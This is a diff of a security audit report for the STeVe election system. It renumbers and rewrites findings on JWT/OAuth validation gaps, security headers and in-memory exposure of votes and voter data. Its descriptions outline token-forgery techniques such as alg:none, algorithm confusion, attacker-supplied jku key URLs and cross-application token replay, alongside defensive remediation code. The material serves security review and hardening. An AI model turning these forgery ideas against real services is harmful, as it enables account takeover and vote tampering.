+Token/session validation is entirely delegated to the asfquart framework. The application code contains zero explicit signature validation, and no configuration parameters for signature verification keys are provided. If asfquart fails to validate, the application has no defense-in-depth. The application's trust model assumes asfquart.session.read() returns fully validated, trustworthy data. Every endpoint reads session data and uses uid directly for authorization decisions (database queries, ownership checks, logging) without any additional verification layer.
 
 **Remediation:**
 
@@ -4714,1767 +4912,761 @@ def verify_token(token, public_key, algorithms=['RS256', 'ES256']):
 ```
 
 Additional recommendations:
-1. Audit `asfquart` framework for compliance with ASVS 9.x requirements
+1. Audit asfquart framework for compliance with ASVS 9.x requirements
 2. Configure audience validation with explicit audience ('steve')
-3. Reconsider OIDC avoidance to gain standardized ID token validation
-4. Document and configure algorithm allowlist (RS256, ES256)
-5. Add issuer validation for expected token issuer (https://oauth.apache.org)
-6. Implement defense-in-depth with application-level validation of critical session properties
+3. Reconsider OIDC avoidance - evaluate if override removes security protections
+4. Document algorithm allowlist - explicitly configure permitted algorithms (RS256, ES256)
+5. Add issuer validation - configure expected token issuer (https://oauth.apache.org)
+6. Implement defense-in-depth for sessions with application-level validation of critical properties
 7. Implement or verify JWKS endpoint caching and rotation handling
 8. Implement explicit token type checking to prevent cross-purpose token reuse
 
 ---
 
-#### FINDING-227: No Algorithm Restriction Configuration Visible
+#### FINDING-211: No Algorithm Restriction Configuration Visible
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L1 |
-| **CWE** | N/A |
-| **ASVS Sections** | 9.1.2 |
-| **Files** | v3/server/main.py:27-42 |
-| **Source Reports** | 9.1.2.md |
-| **Related Findings** | None | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L1 |
+| CWE | - |
+| ASVS Sections | 9.1.2 |
+| Files | v3/server/main.py:27-42 |
+| Source Reports | 9.1.2.md |
+| Related Findings | - |
 
-No algorithm allowlist is configured anywhere in the provided application code. If the asfquart framework or any JWT library processes self-contained tokens, there is no explicit restriction to approved algorithms (e.g., RS256, ES256) and no explicit prohibition of the 'None' algorithm. If the underlying framework uses a JWT library that accepts the alg: none header or allows algorithm confusion attacks (e.g., treating an RSA public key as an HMAC secret with HS256), an attacker could forge valid-looking tokens. The audit context specifies only approved algorithms (RS256, ES256) are allowed (not HS256 with shared secrets) — no such restriction is implemented or configured in the visible code.
+**Description:**
+
+No algorithm allowlist is configured anywhere in the provided application code. If the asfquart framework or any JWT library processes self-contained tokens, there is no explicit restriction to approved algorithms (e.g., RS256, ES256) and no explicit prohibition of the 'None' algorithm. The audit context specifies that only approved algorithms (RS256, ES256) are allowed (not HS256 with shared secrets), but no such restriction is implemented or configured in the visible code. If the underlying framework uses a JWT library that accepts the alg: none header or allows algorithm confusion attacks (e.g., treating an RSA public key as an HMAC secret with HS256), an attacker could forge valid-looking tokens.
 
 **Remediation:**
 
-In create_app() or configuration, explicitly set allowed algorithms. Configure algorithm allowlist for token validation: app.config['TOKEN_ALGORITHMS'] = ['RS256', 'ES256'] (No 'none', no HS256), app.config['TOKEN_REJECT_NONE_ALG'] = True. If using PyJWT directly: ALLOWED_ALGORITHMS = ['RS256', 'ES256'] and jwt.decode(token, key, algorithms=ALLOWED_ALGORITHMS) with never passing algorithms=None.
+In create_app() or configuration, explicitly set allowed algorithms. Configure algorithm allowlist for token validation: app.config['TOKEN_ALGORITHMS'] = ['RS256', 'ES256'] (No 'none', no HS256) and app.config['TOKEN_REJECT_NONE_ALG'] = True. If using PyJWT directly, use: ALLOWED_ALGORITHMS = ['RS256', 'ES256'] and jwt.decode(token, key, algorithms=ALLOWED_ALGORITHMS) (Never pass algorithms=None).
 
 ---
 
-#### FINDING-228: No Key Material Source Validation Configured
+#### FINDING-212: No Key Material Source Validation Configured
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L1 |
-| **CWE** | N/A |
-| **ASVS Sections** | 9.1.3 |
-| **Files** | v3/server/main.py:27-42 |
-| **Source Reports** | 9.1.3.md |
-| **Related Findings** | None | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L1 |
+| CWE | - |
+| ASVS Sections | 9.1.3 |
+| Files | v3/server/main.py:27-42 |
+| Source Reports | 9.1.3.md |
+| Related Findings | - |
 
-No configuration of trusted key sources, no JKU/x5u/JWK header allowlists, and no pinned public keys for the OAuth issuer (oauth.apache.org) are visible in the application code. If self-contained tokens (JWTs) are used with headers like jku (JSON Web Key URL), an attacker could potentially craft a token pointing to their own key server, causing the application to validate the forged token against attacker-controlled keys. Data flow: OAuth provider issues tokens → Token may contain jku/x5u/jwk headers → Application/framework processes token → No visible restriction on key source headers.
+**Description:**
+
+The application does not configure trusted key sources, JKU/x5u/JWK header allowlists, or pinned public keys for the OAuth issuer (oauth.apache.org). If self-contained tokens (JWTs) are used with headers like jku (JSON Web Key URL), an attacker could potentially craft a token pointing to their own key server, causing the application to validate the forged token against attacker-controlled keys. OAuth provider issues tokens → Token may contain jku/x5u/jwk headers → Application/framework processes token → No visible restriction on key source headers.
 
 **Remediation:**
 
-Configure trusted key sources (TRUSTED_JWKS_URLS = ['https://oauth.apache.org/.well-known/jwks.json'], TRUSTED_ISSUERS = ['https://oauth.apache.org']). In token validation, reject tokens with jku/x5u/jwk headers unless they match the allowlist. Implement validation function to check token headers against allowlist and reject untrusted sources or embedded keys.
+Configure trusted key sources: TRUSTED_JWKS_URLS = ['https://oauth.apache.org/.well-known/jwks.json'] and TRUSTED_ISSUERS = ['https://oauth.apache.org']. In token validation, reject tokens with jku/x5u/jwk headers unless they match the allowlist. Implement validation function to check token headers and raise errors for untrusted jku URLs, x5u headers, and embedded jwk headers. Use pre-configured keys instead of allowing embedded keys.
 
 ---
 
-#### FINDING-229: No Token Expiry Verification in Application Code
+#### FINDING-213: No Token Expiry Verification in Application Code
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L1 |
-| **CWE** | N/A |
-| **ASVS Sections** | 9.2.1 |
-| **Files** | v3/server/pages.py:75-106 |
-| **Source Reports** | 9.2.1.md |
-| **Related Findings** | None | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L1 |
+| CWE | - |
+| ASVS Sections | 9.2.1 |
+| Files | v3/server/pages.py:75-106 |
+| Source Reports | 9.2.1.md |
+| Related Findings | - |
 
-The application reads session data and checks only for presence (if s:), not for temporal validity. No exp, nbf, or iat claim verification is visible. If asfquart.session.read() does not internally verify token expiration, expired sessions would be accepted indefinitely. The application's trust model assumes asfquart.session.read() returns fully validated, trustworthy data. Every endpoint reads session data and uses uid directly for authorization decisions without any additional verification layer. Data flow: asfquart.session.read() returns session dict, application checks only if s: (truthy), accepts claims without time validation.
+**Description:**
+
+The application reads session data and checks only for presence (if s:), not for temporal validity. No exp, nbf, or iat claim verification is visible. If asfquart.session.read() does not internally verify token expiration, expired sessions would be accepted indefinitely. Data flow: asfquart.session.read() returns session dict, application checks only if s: (truthy), accepts claims without time validation. If session tokens or OAuth tokens don't have expiry enforcement, a stolen/leaked token could be used indefinitely, even after a user's access should have been revoked.
 
 **Remediation:**
 
-Verify session hasn't expired at the application layer even if framework handles this. Check exp claim: if time.time() > s['exp'], treat as unauthenticated. Check nbf claim: if time.time() < s['nbf'], treat as unauthenticated. Add defense-in-depth validation of critical session properties (expiry, audience, type) even if the framework also validates them.
+Verify session hasn't expired at application level. If 'exp' claim exists in session, check if current time exceeds exp value and reject expired sessions. If 'nbf' claim exists, check if current time is before nbf value and reject not-yet-valid sessions. Example: if 'exp' in s: import time; if time.time() > s['exp']: treat as unauthenticated. Similarly check 'nbf' claim if present.
 
 ---
 
-#### FINDING-230: No Token Type Differentiation or Verification
+#### FINDING-214: No Token Type Differentiation or Verification
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 9.2.2 |
-| **Files** | v3/server/pages.py:75-106, v3/server/main.py:27-42 |
-| **Source Reports** | 9.2.2.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 9.2.2 |
+| Files | v3/server/pages.py:75-106, v3/server/main.py:27-42 |
+| Source Reports | 9.2.2.md |
+| Related Findings | - |
 
-The application explicitly avoids OIDC (which provides standard ID tokens with typ claims and clear access/identity token separation). The plain OAuth flow used does not distinguish between token types. No typ or token_use claim is checked before accepting token contents for authentication decisions. Without token type verification, there is a risk of token misuse. For example, if different token types are issued for different purposes (API access vs. user identity), the absence of type checking could allow an access token to be used where an ID token is expected, potentially granting unintended access. Data flow: OAuth response → framework creates session → application uses session for both identity (display name/email) and authorization (uid for access decisions) → no verification that the token was intended for identity vs. authorization.
+**Description:**
+
+The application explicitly avoids OIDC (which provides standard ID tokens with typ claims and clear access/identity token separation). The plain OAuth flow used does not distinguish between token types. No typ or token_use claim is checked before accepting token contents for authentication decisions. Without token type verification, there is a risk of token misuse. For example, if different token types are issued for different purposes (API access vs. user identity), the absence of type checking could allow an access token to be used where an ID token is expected, potentially granting unintended access.
 
 **Remediation:**
 
-If using OIDC (recommended over plain OAuth), the framework should validate that ID tokens are used for authentication and access tokens for API calls. At the application level, implement token type checking: verify that session tokens have appropriate token_type or typ claims (e.g., 'id_token' or 'session') before accepting them for identity-related decisions. Reject tokens that do not match the expected type for the intended purpose.
+If using OIDC (recommended over plain OAuth), the framework should validate that ID tokens are used for authentication and access tokens for API calls. At the application level, implement token type checking:
+
+```python
+async def basic_info():
+    s = await asfquart.session.read()
+    if s:
+        # Verify this is an identity-purpose session/token
+        token_type = s.get('token_type', s.get('typ'))
+        if token_type not in ('id_token', 'session'):
+            # Reject non-identity tokens
+            basic.update(uid=None, name=None, email=None)
+            return basic
+        basic.update(uid=s['uid'], name=s['fullname'], email=s['email'])
+```
 
 ---
 
-#### FINDING-231: No Audience Claim Validation Configured
+#### FINDING-215: OIDC Explicitly Bypassed Removing Standard Audience Protection
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 9.2.3 |
-| **Files** | v3/server/main.py:27-42, v3/server/pages.py:75-106 |
-| **Source Reports** | 9.2.3.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 9.2.4 |
+| Files | v3/server/main.py:29-35 |
+| Source Reports | 9.2.4.md |
+| Related Findings | - |
 
-No audience (aud) claim validation is configured or performed anywhere in the visible application code. The application identifier 'steve' is used for app construction but not configured as an expected audience for token validation. If oauth.apache.org issues tokens for multiple applications (which is likely given it's a shared OAuth provider for all ASF services), a token intended for another ASF application could potentially be replayed against this STeVe application. Without audience validation, cross-application token reuse is possible. Data flow: OAuth token → session → asfquart.session.read() → no aud claim check → application accepts any valid token regardless of intended audience.
+**Description:**
 
-**Remediation:**
-
-Configure expected audience in create_app(): app.config['TOKEN_AUDIENCE'] = 'steve' and app.config['TOKEN_ISSUER'] = 'https://oauth.apache.org'. Implement token validation function that checks if 'aud' claim matches EXPECTED_AUDIENCE (handling both string and list formats) and validates 'iss' claim matches EXPECTED_ISSUER. Raise ValueError if validation fails.
-
----
-
-#### FINDING-232: No Clear-Site-Data Header or Client-side Storage Cleanup Mechanism Present
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L1 |
-| **CWE** | - |
-| **ASVS Sections** | 14.3.1 |
-| **Files** | v3/steve/election.py, v3/schema.sql, v3/docs/schema.md |
-| **Source Reports** | 14.3.1.md |
-| **Related** | - | **Description:**
-
-The provided code constitutes the data access layer of an election system that handles highly sensitive data (voter eligibility, encrypted votes, election metadata). The election.py module exposes methods that return authenticated/sensitive data to callers. Without a Clear-Site-Data header sent on session termination/logout, sensitive election data (voter identity associations, voting status per issue, election ownership information) may persist in browser caches, cookies, and storage after the user's session ends. Given the core security requirement of ballot secrecy, residual data showing which issues a voter has voted upon (has_voted_upon results) could persist on shared or compromised devices. Type A gap: No control exists in provided codebase. The web framework layer (Quart) is not included in the audit scope, but no evidence of a logout handler sending Clear-Site-Data header is present.
+The code explicitly overrides the asfquart framework's default OAuth/OIDC configuration (which presumably includes proper OIDC flows with audience validation). The comment 'Avoid OIDC' and the uncertain 'is this really needed right now?' suggest this was done as a quick workaround rather than a deliberate security decision. OIDC provides built-in audience restriction via: ID Token aud claim (MUST contain client_id per spec), Token endpoint client authentication, and Standardized token validation procedures. By bypassing OIDC, the application loses these protections that directly satisfy ASVS 9.2.4. The application deliberately disables a framework-level control that would provide audience restriction, creating a false sense of security since the asfquart.auth.require decorator appears to work but doesn't validate audience claims.
 
 **Remediation:**
 
-In the Quart web layer (not provided), implement a logout endpoint that invalidates server-side session and sends Clear-Site-Data header with values 'cache', 'cookies', 'storage'. Additionally, implement client-side cleanup for cases where server connection is unavailable using JavaScript beforeunload event listener to clear localStorage and sessionStorage when session expires.
+Use standard OIDC flow which provides audience validation:
 
----
-
-#### FINDING-233: Data Access Layer Returns Sensitive Data Without Browser Storage Restrictions
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 14.3.3 |
-| **Files** | v3/steve/election.py:has_voted_upon method, v3/steve/election.py:get_voters_for_email method |
-| **Source Reports** | 14.3.3.md |
-| **Related** | - | **Description:**
-
-The election module's API surface returns data that must not be persisted in client-side browser storage (localStorage, sessionStorage, IndexedDB). While the provided code contains no client-side JavaScript, the data structures returned are rich in sensitive information that could violate ballot secrecy if stored. The has_voted_upon method creates a voter-to-issue-participation mapping. The get_voters_for_email method returns PII: person IDs, names, and email addresses. If any client-side JavaScript stores has_voted_upon results, it directly links voter identity (PID) to voting participation per issue, violating ballot secrecy. If get_voters_for_email results are stored, it exposes voter PII. The domain context explicitly states that client-side storage should not contain vote data or voter-vote associations. No client-side storage restriction mechanism is visible in the provided code. No Content-Security-Policy or JavaScript controls preventing storage are present.
-
-**Remediation:**
-
-1. At the web framework layer, implement CSP headers that restrict JavaScript capabilities: response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'". 2. In any client-side JavaScript, explicitly avoid storing sensitive API responses. Keep sensitive data only in memory (JavaScript variables) that are garbage-collected on page navigation. 3. Add a security comment/contract to the data access layer methods documenting that results contain voter-specific data that MUST NOT be persisted in client-side storage.
-
----
-
-#### FINDING-234: No HTTP Security Headers Configuration or Documentation
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | - |
-| **ASVS Sections** | 3.1.1 |
-| **Files** | v3/server/pages.py:entire file |
-| **Source Reports** | 3.1.1.md |
-| **Related** | - | **Description:**
-
-The application does not configure or document any browser security features. There is no evidence of: HTTP Strict Transport Security (HSTS) headers, Content Security Policy (CSP) headers, X-Content-Type-Options headers, X-Frame-Options or frame-ancestors CSP directive, Referrer-Policy headers, or Permissions-Policy headers. Furthermore, there is no documentation (in code comments, configuration files, or docstrings) specifying what browser security features are expected or how the application should behave when they are unavailable. Without documented browser security requirements and enforced headers: (1) No HSTS means connections may be downgraded to HTTP (especially relevant since domain context acknowledges TLS termination at reverse proxy), (2) No CSP means the application is more vulnerable to XSS exploitation, (3) No documentation means deployment teams cannot verify correct security configuration, (4) Browsers with insufficient security features will access the application without warning.
-
-**Remediation:**
-
-Add security headers middleware: @APP.after_request async def set_security_headers(response): response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'; response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'; style-src 'self'"; response.headers['X-Content-Type-Options'] = 'nosniff'; response.headers['X-Frame-Options'] = 'DENY'; response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'; return response. Additionally, create a SECURITY.md or equivalent documentation specifying: Required browser features (TLS 1.2+, JavaScript enabled, secure cookie support), Expected headers from reverse proxy (HSTS, etc.), Behavior when security features are unavailable (graceful degradation vs. blocking).
+```python
+def create_app():
+    "Create the asfquart app and its endpoints."
+    
+    # Use standard OIDC flow which provides audience validation
+    # Configure client_id for audience restriction
+    app = asfquart.construct('steve', app_dir=THIS_DIR, static_folder=None)
+    
+    # If custom OAuth is needed, ensure audience is configured
+    app.config['OAUTH_CLIENT_ID'] = 'steve-voting-system'
+    app.config['OAUTH_EXPECTED_AUDIENCE'] = 'steve-voting-system'
+    app.config['OAUTH_EXPECTED_ISSUER'] = 'https://oauth.apache.org'
+    
+    import pages
+    import api
+    return app
+```
 
 ### 3.4 Low
 
-#### FINDING-235: Key Sharing Scope Not Formally Documented
+#### FINDING-216: Key Sharing Scope Not Formally Documented
 
 | Attribute | Value |
 |-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | N/A |
-| ASVS sections | 11.1.1 |
-| Files | v3/steve/crypto.py, v3/steve/election.py |
-| Source Reports | 11.1.1.md |
-| Related | None | **Description:**
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 11.1.1 |
+| **Affected File(s)** | v3/steve/crypto.py, v3/steve/election.py |
+| **Source Report(s)** | 11.1.1.md |
+| **Related Finding(s)** | None |
+
+**Description:**
 
 The opened_key in each election effectively acts as a shared secret used by the system to derive per-voter vote tokens. While the key is only accessible to the application server (single entity), the sharing boundaries are not formally documented. The key derivation chain (opened_key → vote_token → vote_key) means compromise of the opened_key enables decryption of all votes in that election. Without formal documentation of key sharing boundaries, there's risk of architectural changes inadvertently exposing keys to additional entities.
 
 **Remediation:**
 
-Formally document key sharing boundaries and access control policies for all cryptographic keys, particularly the opened_key. Document the key derivation chain and the security implications of opened_key compromise.
+Formally document key sharing boundaries and access scope for all cryptographic keys, particularly the opened_key. Include this in the overall key management policy document.
 
 ---
 
-#### FINDING-236: Misleading HKDF Info Parameter Suggests Incomplete Migration
+#### FINDING-217: Misleading HKDF Info Parameter Suggests Incomplete Migration
 
 | Attribute | Value |
 |-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2, L3 |
-| CWE | N/A |
-| ASVS sections | 11.2.2, 11.3.4 |
-| Files | v3/steve/crypto.py:63-67 |
-| Source Reports | 11.2.2.md, 11.3.4.md |
-| Related | None | **Description:**
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2, L3 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 11.2.2, 11.3.4 |
+| **Affected File(s)** | v3/steve/crypto.py:63-67, v3/steve/crypto.py:60-67 |
+| **Source Report(s)** | 11.2.2.md, 11.3.4.md |
+| **Related Finding(s)** | None |
 
-The HKDF `info` parameter is set to `b'xchacha20_key'` while the system currently uses Fernet for encryption. When the system migrates to XChaCha20-Poly1305, this `info` value will remain the same, meaning keys derived for Fernet would be identical to keys derived for XChaCha20-Poly1305. If old ciphertexts coexist with new ciphertexts during migration, this violates the principle that a single key should not be used across different algorithm/data-element pairs.
+**Description:**
+
+The HKDF info parameter is set to b'xchacha20_key' but the actual encryption uses Fernet (AES-128-CBC). This is a domain separation label that typically identifies the intended key usage. When the migration to XChaCha20-Poly1305 occurs, this info value must NOT change (or old ciphertext becomes undecryptable), creating a confusing situation where the info label is correct for new data but was technically wrong for historical data.
 
 **Remediation:**
 
-Use `info=b'fernet_vote_key'` now, and switch to `info=b'xchacha20_vote_key'` during migration to ensure domain separation. Example: `info=b'fernet_vote_key',  # Change to b'xchacha20_vote_key' when algorithm changes`
+Either use a generic info value like b'vote_encryption_key_v1' or document that the current info value was chosen proactively for the planned migration. Plan migration path for Fernet → XChaCha20-Poly1305 to ensure the HKDF info parameter changes during migration to prevent key reuse across algorithms.
 
 ---
 
-#### FINDING-237: BLAKE2b usage may not meet strict NIST compliance requirements
+#### FINDING-218: BLAKE2b Usage Not NIST FIPS Approved
 
 | Attribute | Value |
 |-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L1 |
-| CWE | N/A |
-| ASVS sections | 11.4.1 |
-| Files | v3/steve/crypto.py:45 |
-| Source Reports | 11.4.1.md |
-| Related | None | **Description:**
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L1 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 11.4.1 |
+| **Affected File(s)** | v3/steve/crypto.py:45 |
+| **Source Report(s)** | 11.4.1.md |
+| **Related Finding(s)** | None |
 
-BLAKE2b is a modern, secure hash function (RFC 7693) with a 512-bit output, providing strong collision resistance. However, it is not listed in NIST FIPS 180-4 (SHA-2) or FIPS 202 (SHA-3) as an "approved" hash function. Depending on organizational compliance requirements, this could be a concern. In practice, BLAKE2b is used within Argon2 itself (which is NIST-recognized via SP 800-63B), making this a very low-risk finding.
+**Description:**
+
+BLAKE2b is a modern, secure hash function (RFC 7693) with a 512-bit output, providing strong collision resistance. However, it is not listed in NIST FIPS 180-4 (SHA-2) or FIPS 202 (SHA-3) as an 'approved' hash function. Depending on organizational compliance requirements, this could be a concern. In practice, BLAKE2b is used within Argon2 itself (which is NIST-recognized via SP 800-63B), making this a very low-risk finding.
 
 **Remediation:**
 
-If strict NIST compliance is required, replace with SHA-512: `digest = hashlib.sha512(edata).digest()  # 64 bytes, NIST-approved`
+If strict NIST compliance is required, replace with SHA-512: import hashlib; digest = hashlib.sha512(edata).digest()  # 64 bytes, NIST-approved
 
 ---
 
-#### FINDING-238: HKDF usage documentation needed to clarify key stretching architecture
+#### FINDING-219: HKDF Usage Lacks Documentation Clarifying Security Model
 
 | Attribute | Value |
 |-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | N/A |
-| ASVS sections | 11.4.4 |
-| Files | v3/steve/crypto.py:60-67 |
-| Source Reports | 11.4.4.md |
-| Related | None | **Description:**
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 11.4.4 |
+| **Affected File(s)** | v3/steve/crypto.py:60-67 |
+| **Source Report(s)** | 11.4.4.md |
+| **Related Finding(s)** | None |
+
+**Description:**
 
 HKDF is not a key-stretching function and provides no computational cost against brute-force. However, since the input (vote_token) is already the 32-byte output of Argon2 (which provides the key stretching), HKDF is being used appropriately as a key derivation function to transform already-stretched material into an encryption key. This is acceptable architecture but worth documenting that the stretching occurs upstream.
 
 **Remediation:**
 
-Add a comment clarifying the security model: 'Note: Key stretching is provided by Argon2 in gen_vote_token(). HKDF here only transforms the already-stretched token into a key suitable for the encryption algorithm.'
+Add a comment clarifying the security model in the _b64_vote_key function documentation explaining that key stretching is provided by Argon2 in gen_vote_token() and HKDF here only transforms the already-stretched token into a key suitable for the encryption algorithm.
 
 ---
 
-#### FINDING-239: All votes decrypted and held simultaneously in memory during tally
+#### FINDING-220: All Votes Decrypted and Held Simultaneously in Memory During Tally
 
 | Attribute | Value |
 |-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | N/A |
-| ASVS sections | 11.7.2 |
-| Files | v3/steve/election.py:248-294 |
-| Source Reports | 11.7.2.md |
-| Related | None | **Description:**
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L3 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 11.7.2 |
+| **Affected File(s)** | v3/steve/election.py:248-294 |
+| **Source Report(s)** | 11.7.2.md |
+| **Related Finding(s)** | None |
 
-The entire set of decrypted votes exists in cleartext memory simultaneously. For elections with many voters, this creates a larger window where all vote data is exposed. There is no explicit clearing of sensitive variables after use. Data flow: All votes for an issue are decrypted simultaneously → stored in `votes` list → remain in memory until garbage collected.
+**Description:**
+
+The entire set of decrypted votes exists in cleartext memory simultaneously in the tally_issue() function. All votes for an issue are decrypted simultaneously, stored in a votes list, and remain in memory until garbage collected. For elections with many voters, this creates a larger window where all vote data is exposed. There is no explicit clearing of sensitive variables after use.
 
 **Remediation:**
 
-Process votes through streaming tally where possible. For STV (requires all votes), minimize exposure window by explicitly clearing sensitive data in a finally block. Use pattern: clear each vote string to None, then clear the list. Note: Python doesn't guarantee memory zeroing, but this reduces exposure window.
+Process votes through streaming tally where possible. For STV (which requires all votes), minimize exposure window by implementing explicit clearing of sensitive data in a finally block. Clear the votes list by setting each element to None and calling clear(). While Python doesn't guarantee memory zeroing, this reduces the exposure window.
 
 ---
 
-#### FINDING-240: Voter identity data accumulated in cleartext memory during election data gathering
+#### FINDING-221: Voter Identity Data Accumulated in Cleartext Memory During Election Data Gathering
 
 | Attribute | Value |
 |-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | N/A |
-| ASVS sections | 11.7.2 |
-| Files | v3/steve/election.py:82-107 |
-| Source Reports | 11.7.2.md |
-| Related | None | **Description:**
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L3 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 11.7.2 |
+| **Affected File(s)** | v3/steve/election.py:82-107 |
+| **Source Report(s)** | 11.7.2.md |
+| **Related Finding(s)** | None |
 
-Voter identity data (PIDs and email addresses) exists in unencrypted memory longer than necessary. The assembled string is only needed for hashing but persists until garbage collected. Data flow: All voter PIDs and emails assembled in cleartext string → encoded to bytes → passed to hash function → original strings remain in memory.
+**Description:**
+
+In gather_election_data(), all voter PIDs and emails are assembled in a cleartext string, encoded to bytes, and passed to a hash function, but the original strings remain in memory until garbage collected. Voter identity data (PIDs and email addresses) exists in unencrypted memory longer than necessary. The assembled string is only needed for hashing but persists until garbage collected.
 
 **Remediation:**
 
-Use incremental hashing to avoid accumulating all data in a single string. Create a hash object (e.g., hashlib.blake2b()) and update it incrementally for each metadata element, issue, and voter record. Return the final digest without accumulating sensitive data in memory.
+Use incremental hashing to avoid accumulating all data in a single string. Create a hash object and update it incrementally as each piece of data is retrieved from the database, encoding each piece before updating the hash. Return the final digest without accumulating all voter data in memory simultaneously.
 
 ---
 
-#### FINDING-241: No Evidence of Cache-Control Mechanisms for Sensitive Data Responses
+#### FINDING-222: Redirect URI handling delegates validation entirely to external authorization server with no client-side verification
 
 | Attribute | Value |
 |-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | N/A |
-| ASVS sections | 14.2.2 |
-| Files | v3/steve/election.py |
-| Source Reports | 14.2.2.md |
-| Related | None | **Description:**
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L1, L2 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 10.4.1, 6.5.1 |
+| **Affected File(s)** | v3/server/main.py:39-42 |
+| **Source Report(s)** | 10.4.1.md, 6.5.1.md |
+| **Related Finding(s)** | None |
 
-The data access layer returns sensitive data objects but no cache prevention controls are visible in the provided code. The data access layer in election.py returns sensitive data objects including voter PII (email, name) and election metadata (salt, opened_key) without visible HTTP cache-control headers or cache purging mechanisms. Without explicit cache controls at the HTTP layer, voter email addresses could be cached in reverse proxies, election metadata with sensitive fields could persist in application-level caches, and browser caches could store sensitive responses. The web layer (Quart framework) is not in scope for this audit.
+**Description:**
+
+This application is an OAuth CLIENT, not an authorization server. The actual redirect URI validation is the responsibility of `oauth.apache.org`. The code configures the OAuth initiation URL with a `redirect_uri` parameter (populated via `%s`), but: 1. We cannot verify from this codebase how the `redirect_uri` value is constructed by `asfquart` 2. The authorization server at `oauth.apache.org` is responsible for exact string comparison validation 3. The `asfquart.generics` module (not provided) handles the actual redirect_uri construction. If the `asfquart` framework constructs the redirect_uri dynamically from request parameters without validation, it could enable open redirect attacks, but this cannot be confirmed from the available code.
 
 **Remediation:**
 
-In the Quart web handlers (not provided), add appropriate headers for endpoints returning sensitive data. Implement an after_request handler to add Cache-Control: no-store, no-cache, must-revalidate, private headers, along with Pragma: no-cache and Expires: 0 headers for paths like /election/ and /vote/. Example code provided in the report shows implementing this as a Quart after_request decorator.
+Ensure redirect_uri is a hardcoded constant, not derived from user input. Example: OAUTH_REDIRECT_URI = 'https://steve.apache.org/oauth/callback' and use it in the OAuth URL construction as: asfquart.generics.OAUTH_URL_INIT = (f'https://oauth.apache.org/auth?state=%s&redirect_uri={OAUTH_REDIRECT_URI}')
 
 ---
 
-#### FINDING-242: No programmatic enforcement of database file permissions
+#### FINDING-223: OAuth authorization request does not include explicit scope parameter
 
 | Attribute | Value |
 |-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | N/A |
-| ASVS sections | 14.2.4 |
-| Files | v3/steve/election.py:38 |
-| Source Reports | 14.2.4.md |
-| Related | None | **Description:**
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 10.4.11, 9.2.4 |
+| **Affected File(s)** | v3/server/main.py:39-40 |
+| **Source Report(s)** | 10.4.11.md, 9.2.4.md |
+| **Related Finding(s)** | None |
 
-The domain context states 'database file permissions restrict access to the application user only' but there is no verification of file permissions when the database is opened. If the database file is created with overly permissive modes (e.g., 0644 instead of 0600), sensitive data including encrypted votes and cryptographic salts would be accessible to other system users.
+**Description:**
 
-**Remediation:**
-
-Check and enforce database file permissions in open_database(): verify that existing database files do not have group or world read permissions, and set mode 0600 on newly created database files.
-
----
-
-#### FINDING-243: tally_issue returns full set of voter PIDs alongside tally results
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | N/A |
-| ASVS sections | 14.2.6 |
-| Files | v3/steve/election.py:280-320 |
-| Source Reports | 14.2.6.md |
-| Related | None | **Description:**
-
